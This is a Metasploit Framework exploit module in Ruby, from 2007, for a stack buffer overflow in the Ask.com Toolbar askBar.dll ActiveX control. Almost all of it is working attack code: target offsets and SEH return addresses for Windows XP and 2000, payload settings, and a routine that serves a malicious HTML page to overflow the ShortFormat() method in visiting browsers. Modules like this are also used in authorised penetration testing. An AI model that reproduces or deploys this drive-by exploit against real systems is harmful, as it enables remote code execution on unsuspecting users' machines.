##
# $Id: ask_shortformat.rb 4953 2007-05-21 20:51:13Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

module Msf

class Exploits::Windows::Browser::Ask_Shortformat < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::HTML
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Ask.com Toolbar askBar.dll ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack overflow in Ask.com Toolbar 4.0.2.53.
					An attacker may be able to excute arbitrary code by sending an overly
					long string to the "ShortFormat()" method in askbar.dll.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ], 
			'Version'        => '$Revision$',
			'References'     => 
				[
					[ 'URL', 'http://wslabi.com/wabisabilabi/showBidInfo.do?code=ZD-00000148' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'PrepenEncoder' => "\x81\xc4\x54\xf2\xff\xff",	
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0/SP1 Pro English',     { 'Offset' => 2876, 'Ret' => 0x71aa32ad } ],
					[ 'Windows 2000 Pro English ALL',       { 'Offset' => 1716, 'Ret' => 0x75022ac4 } ],
				],
			'DisclosureDate' => 'Sep 24 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
			false
	end

	def check_dependencies
			use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)
		
		# Set the exploit buffer	
		filler = rand_text_alpha(target['Offset'])
		seh = generate_seh_payload(target.ret)
		sploit = filler + seh + rand_text_alpha(payload.encoded.length) 
		
		# Build out the message
		content = %Q|
			<html>
			<object classid='clsid:5A074B2B-F830-49DE-A31B-5BB9D7F6B407' id='#{vname}'></object>
			<script language='javascript'>
			#{strname} = new String('#{sploit}');
			#{vname}.ShortFormat = #{strname}
			</script>
			</html>
                  |
		
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
		
		# Handle the payload
		handler(cli)
	end

end
end
